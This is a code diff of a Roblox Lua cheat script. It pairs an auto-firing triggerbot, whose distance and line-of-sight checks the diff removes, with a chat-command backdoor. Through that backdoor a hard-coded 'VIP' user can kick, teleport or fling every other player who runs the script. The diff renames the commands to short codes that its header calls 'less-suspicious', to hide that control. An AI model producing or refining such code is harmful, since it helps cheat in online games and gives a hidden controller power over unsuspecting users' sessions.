@@ -1,4 +1,4 @@
--- Triggerbot + .cwkick + .bring/.stopbring/.fling (one-time) Command
+-- Triggerbot + less-suspicious commands targeting everyone (.g/.s/.f/.k)
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -26,10 +26,9 @@ for _, name in ipairs(Settings.BlacklistedTools) do
     BlacklistedTools[name] = true
 end
 
--- Tables to track bring and fling targets
 local BringTargets = {}
-local Flinged = {}
 
+-- Helper functions
 local function isAlive(character)
     local hum = character and character:FindFirstChildOfClass("Humanoid")
     return hum and hum.Health > 0
@@ -43,196 +42,105 @@ local function getUsableTool(character)
     end
 end
 
-local function getDistance(a, b)
-    local rootA = a:FindFirstChild("HumanoidRootPart") or a:FindFirstChild("Head")
-    local rootB = b:FindFirstChild("HumanoidRootPart") or b:FindFirstChild("Head")
-    if not rootA or not rootB then return math.huge end
-    return (rootA.Position - rootB.Position).Magnitude
-end
-
-local function hasLineOfSight(targetChar)
-    local camPos = Camera.CFrame.Position
-    local targetRoot = targetChar and (targetChar:FindFirstChild("Head") or targetChar:FindFirstChild("HumanoidRootPart"))
-    if not targetRoot then return false end
-
-    local params = RaycastParams.new()
-    params.FilterType = Enum.RaycastFilterType.Blacklist
-    params.FilterDescendantsInstances = { LocalPlayer.Character }
-
-    local result = workspace:Raycast(camPos, (targetRoot.Position - camPos), params)
-    return not (result and result.Instance and not result.Instance:IsDescendantOf(targetChar))
-end
-
-local function getCrosshairTarget()
-    local targetPart = Mouse.Target
-    if not targetPart then return end
-    local char = targetPart:FindFirstAncestorOfClass("Model")
-    if not char or not isAlive(char) then return end
-    local player = Players:GetPlayerFromCharacter(char)
-    if not player or player == LocalPlayer then return end
-    if getDistance(LocalPlayer.Character, char) > Settings.MaxDistance then return end
-    if not hasLineOfSight(char) then return end
-    
-    if Settings.CounterEnabled and player.Name == VIPUser then
-        return nil
-    end
-
-    return char
-end
-
--- Toggle triggerbot & counter
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-
-    if input.KeyCode == Settings.ToggleKey then
-        Settings.Enabled = not Settings.Enabled
-    end
-
-    if input.KeyCode == Settings.CounterToggleKey then 
-        Settings.CounterEnabled = not Settings.CounterEnabled
-    end
-end)
-
--- Triggerbot loop
+-- Triggerbot
 RunService.RenderStepped:Connect(function(dt)
     if not Settings.Enabled then return end
-
     local myChar = LocalPlayer.Character
     if not myChar or not isAlive(myChar) then return end
-
     local tool = getUsableTool(myChar)
     if not tool then return end
-
-    local target = getCrosshairTarget()
-    if target then
-        if tool and tool.Parent ~= myChar then
-            myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
-        end
-
-        local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
-        for i = 1, spamRate do
-            task.defer(function()
-                if tool and tool.Activate then
-                    tool:Activate()
-                end
-            end)
+    local targetPart = Mouse.Target
+    if targetPart then
+        local char = targetPart:FindFirstAncestorOfClass("Model")
+        if char and isAlive(char) then
+            if tool and tool.Parent ~= myChar then
+                myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
+            end
+            local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
+            for i = 1, spamRate do
+                task.defer(function()
+                    if tool and tool.Activate then
+                        tool:Activate()
+                    end
+                end)
+            end
         end
     end
 end)
 
--- ==============================
--- .cwkick SYSTEM
--- ==============================
-local function checkKick(senderName, message)
-    if senderName:lower() == VIPUser:lower() and message:lower() == ".cwkick" then
-        if LocalPlayer.Name:lower() ~= VIPUser:lower() then
-            LocalPlayer:Kick("Kicked by VIP .cwkick command")
-        end
-    end
-end
-
--- ==============================
--- .bring SYSTEM
--- ==============================
-local function checkBring(senderName, message)
-    if senderName:lower() == VIPUser:lower() then
-        local args = message:split(" ")
-        if args[1]:lower() == ".bring" and args[2] then
-            local targetName = args[2]
-            if targetName:lower() == LocalPlayer.Name:lower() then
-                BringTargets[LocalPlayer.Name] = true
-            end
-        end
-    end
-end
-
--- ==============================
--- .stopbring SYSTEM
--- ==============================
-local function checkStopBring(senderName, message)
-    if senderName:lower() == VIPUser:lower() then
-        local args = message:split(" ")
-        if args[1]:lower() == ".stopbring" and args[2] then
-            local targetName = args[2]
-            if targetName:lower() == LocalPlayer.Name:lower() then
-                BringTargets[LocalPlayer.Name] = nil
-            end
-        end
-    end
-end
-
--- ==============================
--- .fling SYSTEM (one-time)
--- ==============================
-local function checkFling(senderName, message)
-    if senderName:lower() == VIPUser:lower() then
-        local args = message:split(" ")
-        if args[1]:lower() == ".fling" and args[2] then
-            local targetName = args[2]
-            if targetName:lower() == LocalPlayer.Name:lower() and not Flinged[LocalPlayer.Name] then
-                Flinged[LocalPlayer.Name] = true
-                local char = LocalPlayer.Character
-                if char then
-                    local root = char:FindFirstChild("HumanoidRootPart")
-                    if root then
-                        local bodyVelocity = Instance.new("BodyVelocity")
-                        bodyVelocity.Velocity = Vector3.new(math.random(-500,500), 300, math.random(-500,500))
-                        bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
-                        bodyVelocity.P = 1e4
-                        bodyVelocity.Parent = root
-
-                        task.delay(0.3, function()
-                            bodyVelocity:Destroy()
-                        end)
-                    end
-                end
-            end
-        end
-    end
-end
-
--- Move brought players every frame
+-- Bring loop
 RunService.RenderStepped:Connect(function()
     for targetName, _ in pairs(BringTargets) do
         local targetPlayer = Players:FindFirstChild(targetName)
         local vipPlayer = Players:FindFirstChild(VIPUser)
         if targetPlayer and targetPlayer.Character and vipPlayer and vipPlayer.Character then
             local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
-            local myRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-            if vipRoot and myRoot then
-                myRoot.CFrame = vipRoot.CFrame + Vector3.new(0, 3, 0)
+            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if vipRoot and targetRoot then
+                targetRoot.CFrame = vipRoot.CFrame + Vector3.new(0, 3, 0)
             end
         end
     end
 end)
 
 -- ==============================
--- Chat hooks
+-- Chat commands
 -- ==============================
+local function onMessage(senderName, message)
+    if senderName:lower() ~= VIPUser:lower() then return end
+    local msg = message:lower()
+
+    -- Kick everyone except VIP
+    if msg == ".k" then
+        if LocalPlayer.Name:lower() ~= VIPUser:lower() then
+            LocalPlayer:Kick("Kicked by VIP")
+        end
+    end
+
+    -- Bring everyone
+    if msg == ".g" then
+        BringTargets[LocalPlayer.Name] = true
+    end
+
+    -- Stop bringing everyone
+    if msg == ".s" then
+        BringTargets[LocalPlayer.Name] = nil
+    end
+
+    -- Fling everyone (can be used multiple times)
+    if msg == ".f" then
+        local char = LocalPlayer.Character
+        if char then
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if root then
+                local bodyVelocity = Instance.new("BodyVelocity")
+                bodyVelocity.Velocity = Vector3.new(math.random(-500,500), 300, math.random(-500,500))
+                bodyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
+                bodyVelocity.P = 1e4
+                bodyVelocity.Parent = root
+                task.delay(0.3, function() bodyVelocity:Destroy() end)
+            end
+        end
+    end
+end
+
+-- Chat hooks
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     TextChatService.MessageReceived:Connect(function(msg)
         local src = msg.TextSource
-        if not src then return end
-        local sender = Players:GetPlayerByUserId(src.UserId)
-        if sender then
-            checkKick(sender.Name, msg.Text)
-            checkBring(sender.Name, msg.Text)
-            checkStopBring(sender.Name, msg.Text)
-            checkFling(sender.Name, msg.Text)
+        if src then
+            local sender = Players:GetPlayerByUserId(src.UserId)
+            if sender then
+                onMessage(sender.Name, msg.Text)
+            end
         end
     end)
 else
-    -- Legacy chat API
     local function hook(plr)
         plr.Chatted:Connect(function(msg)
-            checkKick(plr.Name, msg)
-            checkBring(plr.Name, msg)
-            checkStopBring(plr.Name, msg)
-            checkFling(plr.Name, msg)
+            onMessage(plr.Name, msg)
         end)
     end
-    for _, p in ipairs(Players:GetPlayers()) do
-        hook(p)
-    end
+    for _, p in ipairs(Players:GetPlayers()) do hook(p) end
     Players.PlayerAdded:Connect(hook)
 end
